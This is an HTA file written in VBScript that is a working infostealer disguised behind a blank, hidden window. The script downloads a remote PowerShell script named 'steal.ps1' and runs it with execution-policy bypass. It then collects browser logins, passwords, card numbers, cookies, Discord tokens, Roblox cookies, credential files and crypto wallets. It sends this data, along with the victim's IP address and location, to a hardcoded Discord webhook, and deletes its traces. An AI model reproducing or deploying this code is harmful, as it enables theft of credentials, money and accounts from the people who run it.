<html>
<head><title>.</title>
<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
<script language="VBScript">
window.resizeTo 0,0:window.moveTo -2000,-2000
On Error Resume Next

Dim sh, fso, WH, PC, USER
Set sh  = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

WH   = "https://discord.com/api/webhooks/1375311447839608973/ILdJfm-Tu7IbvMPLxRZhhQk6esgMVMhRj8dxUXpbJwEy4F6XQhf-zfkRXrI3UC8xA7-T"
PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
USER = sh.ExpandEnvironmentStrings("%USERNAME%")

Dim BUF: BUF = ""
Dim BUFC: BUFC = 0

Call GrabTokens
Call Flush
Call IP
Call Flush

window.close()

' ============================================================
Sub GrabTokens()
    Dim url: url = "https://gist.githubusercontent.com/Lxg-cmd/02ee306708c6da2a54e3feb8e713f00d/raw/738e9b19606bfae2a2f67948d5a7f60366138772/steal.ps1"
    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", url, False
    xh.Send
    If xh.Status <> 200 Then
        Call AddEmbed(":x: PS download failed", "HTTP " & xh.Status, 16711680)
        Exit Sub
    End If
    Dim pc: pc = xh.responseText
    Set xh = Nothing
    If Len(pc) < 100 Then
        Call AddEmbed(":x: PS empty", "gist returned " & Len(pc) & " bytes", 16711680)
        Exit Sub
    End If

    Dim psf: psf = TmpFile("steal.ps1")
    WriteFile psf, pc
    sh.Run "cmd /c powershell -NoP -Exec Bypass -File """ & psf & """", 0, True
    fso.DeleteFile psf, True

    Dim tf: tf = TmpFile("steal_result.txt")
    If Not fso.FileExists(tf) Then
        Call AddEmbed(":x: no result file", "PS wrote nothing to " & tf, 16711680)
        Exit Sub
    End If
    Dim raw: raw = ReadFile(tf)
    If Len(raw) < 5 Then
        Call AddEmbed(":x: empty result", "file exists, zero bytes", 16711680)
        Exit Sub
    End If

    Dim lines: lines = Split(raw, vbCrLf)
    Dim first: first = Split(lines(0), Chr(31))
    If first(0) <> "VER" Or first(1) <> "5" Then
        Call AddEmbed(":warning: VERSION MISMATCH", "got [" & first(0) & " " & first(1) & "], expected VER 5" & vbCrLf & "gist is serving an old script", 16711680)
    End If

    ParseLines lines
    fso.DeleteFile tf, True
End Sub

' ============================================================
Sub ParseLines(lines)
    Dim US: US = Chr(31)
    Dim l, f, tag
    Dim cookieDump: cookieDump = ""

    For Each l In lines
        If Len(l) > 4 Then
            f   = Split(l, US)
            tag = f(0)

            If tag = "VER" And UBound(f) >= 1 Then
                Call AddEmbed(":white_check_mark: PS version", f(1), 3447003)
            End If

            If tag = "DBG" And UBound(f) >= 2 Then
                Call AddEmbed(":bug: " & f(1), Left(f(2), 1000), 9807270)
            End If

            If tag = "STAT" And UBound(f) >= 5 Then
                Call AddEmbed(":bar_chart: Summary", f(1) & " | " & f(2) & " | " & f(3) & " | " & f(4) & " | " & f(5) & vbCrLf & "PC: " & PC & " | " & USER, 3447003)
            End If

            If tag = "LOGIN" And UBound(f) >= 5 Then
                Dim d: d = "Profile: " & f(2) & vbCrLf & "URL: " & f(3) & vbCrLf & "User: " & f(4) & vbCrLf & "Pass: " & f(5)
                Call AddEmbed(":globe_with_meridians: " & f(1) & " login", Left(d, 3900), 5793266)
            End If

            If tag = "CARD" And UBound(f) >= 4 Then
                Call AddEmbed(":credit_card: " & f(1) & " card", "Name: " & f(2) & vbCrLf & "Exp: " & f(3) & vbCrLf & "Number: " & f(4), 16776960)
            End If

            If tag = "COOKIE" And UBound(f) >= 4 Then
                cookieDump = cookieDump & f(1) & vbTab & f(2) & vbTab & f(3) & vbTab & f(4) & vbCrLf
            End If

            If tag = "EMAIL" And UBound(f) >= 2 Then
                Call AddEmbed(":e-mail: Email — " & f(1), f(2), 10181046)
            End If

            If tag = "DISCORD" And UBound(f) >= 5 Then
                Dim di: di = "**User:** " & f(1) & vbCrLf
                If f(2) <> "" Then di = di & "**Email:** " & f(2) & vbCrLf
                If f(3) <> "" Then di = di & "**Phone:** " & f(3) & vbCrLf
                If f(4) <> "0" And f(4) <> "" Then di = di & "**ID:** " & f(4) & vbCrLf
                di = di & "**Token:** " & f(5) & vbCrLf & "**PC:** " & PC
                Call AddEmbed(":gift: Discord Token", Left(di, 3900), 5793266)
            End If

            If tag = "ROBLOX" And UBound(f) >= 1 Then
                Call AddEmbed(":cookie: Roblox", "Size: " & Len(f(1)) & " | PC: " & PC, 65280)
                Call PostFile("roblox_cookie.txt", f(1))
            End If

            If tag = "ROBLOXRAW" And UBound(f) >= 2 Then
                Call AddEmbed(":page_facing_up: Roblox raw — " & f(1), Left(f(2), 1800), 9807270)
            End If

            If tag = "PASSWORD" And UBound(f) >= 4 Then
                Call AddEmbed(":key: Password DB", f(1) & " | " & f(2) & " | " & f(3) & " | " & Len(f(4)) & " b64 chars", 16776960)
                If f(2) = "RAW_DB" And Len(f(4)) > 0 Then Call PostFile(f(1) & "_" & f(3) & ".db.b64", f(4))
            End If

            If tag = "CREDS" And UBound(f) >= 2 Then
                Call AddEmbed(":page_facing_up: Credential file", f(1) & " — " & f(2), 3447003)
            End If

            If tag = "WALLET" And UBound(f) >= 3 Then
                Call AddEmbed(":briefcase: Wallet", f(1) & " — " & f(2) & " — " & f(3), 65280)
            End If
        End If
    Next

    If Len(cookieDump) > 0 Then
        Call AddEmbed(":cookie: Cookies", "dump attached — " & Len(cookieDump) & " bytes", 65280)
        Call PostFile("cookies_" & PC & ".txt", cookieDump)
    End If
End Sub

' ============================================================
Sub IP()
    Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    xh.SetOption 2, 13056
    xh.Open "GET", "https://api.ipify.org/", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ip: ip = xh.responseText
    If Len(ip) < 7 Then Exit Sub
    xh.Open "GET", "http://ip-api.com/line/" & ip & "?fields=country,regionName,city,isp", False
    xh.Send
    If xh.Status <> 200 Then Exit Sub
    Dim ll: ll = Split(xh.responseText, vbLf)
    Call AddEmbed(":dart: Target", "IP: " & ip & " | " & ll(0) & " | " & ll(1) & " | " & ll(2) & " | " & ll(3) & " | PC: " & PC & " | " & USER, 3447003)
    Set xh = Nothing
End Sub

' ============================================================
Sub AddEmbed(t, d, c)
    Dim DQ: DQ = Chr(34)
    Dim e: e = "{" & DQ & "title" & DQ & ":" & DQ & Ej(Left(t, 250)) & DQ & "," & _
                   DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & _
                   DQ & "color" & DQ & ":" & c & "}"
    If Len(BUF) > 0 Then BUF = BUF & ","
    BUF  = BUF & e
    BUFC = BUFC + 1
    If BUFC >= 10 Then Call Flush
End Sub

Sub Flush()
    If BUFC = 0 Then Exit Sub
    Dim DQ: DQ = Chr(34)
    Dim j: j = "{" & DQ & "embeds" & DQ & ":[" & BUF & "]}"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "application/json"
    h.Send j
    Set h = Nothing
    BUF  = ""
    BUFC = 0
End Sub

Sub PostFile(fn, ct)
    Dim DQ: DQ = Chr(34)
    Dim b: b = Mid(CreateObject("Scriptlet.TypeLib").GUID, 2, 36)
    Dim bd: bd = "--" & b & vbCrLf & _
                 "Content-Disposition: form-data; name=" & DQ & "file" & DQ & "; filename=" & DQ & fn & DQ & vbCrLf & _
                 vbCrLf & ct & vbCrLf & "--" & b & "--"
    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    h.SetOption 2, 13056
    h.Open "POST", WH, False
    h.SetRequestHeader "Content-Type", "multipart/form-data; boundary=" & b
    h.Send bd
    Set h = Nothing
End Sub

' ============================================================
Function TmpFile(name)
    TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name
End Function

Sub WriteFile(path, content)
    Dim f: Set f = fso.CreateTextFile(path, True, True)
    f.Write content
    f.Close
    Set f = Nothing
End Sub

Function ReadFile(path)
    ReadFile = ""
    Dim s: Set s = CreateObject("ADODB.Stream")
    s.Type = 2
    s.Charset = "utf-8"
    s.Open
    s.LoadFromFile path
    ReadFile = s.ReadText(-1)
    s.Close
    Set s = Nothing
End Function

Function Ej(s)
    Ej = s
    Ej = Replace(Ej, Chr(92), Chr(92) & Chr(92))
    Ej = Replace(Ej, Chr(34), Chr(92) & Chr(34))
    Ej = Replace(Ej, vbCrLf, Chr(92) & "n")
    Ej = Replace(Ej, vbCr, Chr(92) & "n")
    Ej = Replace(Ej, vbLf, Chr(92) & "n")
    Ej = Replace(Ej, vbTab, Chr(92) & "t")
End Function
</script>
</head><body></body></html>
